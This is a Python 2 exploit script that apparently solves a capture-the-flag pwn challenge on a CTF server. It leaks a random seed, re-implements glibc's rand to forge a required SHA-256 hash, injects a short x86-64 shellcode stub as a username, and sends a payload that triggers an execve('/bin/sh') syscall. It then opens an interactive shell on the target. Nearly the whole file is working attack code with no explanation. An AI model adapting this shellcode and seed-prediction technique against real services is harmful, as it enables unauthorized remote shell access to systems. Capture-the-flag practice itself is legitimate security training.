import socket, struct, os, binascii, base64, hashlib, time
import telnetlib   

# slightly modified from https://github.com/qbx2/python_glibc_random
def glibc_prng(seed):
    r = [0] * 344
    r[0] = seed

    for i in range(1, 31):
        hi = (r[i-1] / 127773) & 0xffffffff
        lo = (r[i-1] % 127773) & 0xffffffff
        word = 16807 * lo - 2836 * hi
        if word < 0:
            word += 2147483647
        r[i] = word & 0xffffffff
        
        if r[i] < 0:
            r[i] = int32(r[i] + 0x7fffffff)


    for i in range(31, 34):
        r[i] = r[i-31] & 0xffffffff

    for i in range(34, 344):
        r[i] = (r[i-31] + r[i-3]) & 0xffffffff

    i = 344 - 1

    while True:
        i += 1
        r.append((r[i-31] + r[i-3]) & 0xffffffff)
        yield (r[i]&0xffffffff) >> 1

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

    
sc = socket.create_connection(("pwn.sect.ctf.rocks", 31337))

sc.send("aaaaaaaa")
read_until(sc, "aaaaaaaa")
seed = struct.unpack("<i", sc.recv(4))[0]

prng = glibc_prng(seed)

# 00000000  58                pop rax
# 00000001  5E                pop rsi
# 00000002  5A                pop rdx
# 00000003  4889E7            mov rdi,rsp
# 00000006  0F05              syscall

minishell = binascii.a2b_hex("585E5A4889E70F0500")

secret = minishell
for i in xrange(199991):
    secret += chr(next(prng) & 0xff)

read_until(sc, "3) Exit")
sc.send("1")
read_until(sc, "Enter username:")
sc.send(minishell)

read_until(sc, "3) Exit")
sc.send("2")
read_until(sc, "Please enter your secure hash:")
hash = hashlib.sha256(secret).hexdigest()
sc.send(hash)

sc.send("AAAAAAAABBBBBBBBCCCCCCCC" + Q(0x40000) + Q(0x3b) + Q(0) + Q(0) + "/bin/sh\x00")

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  
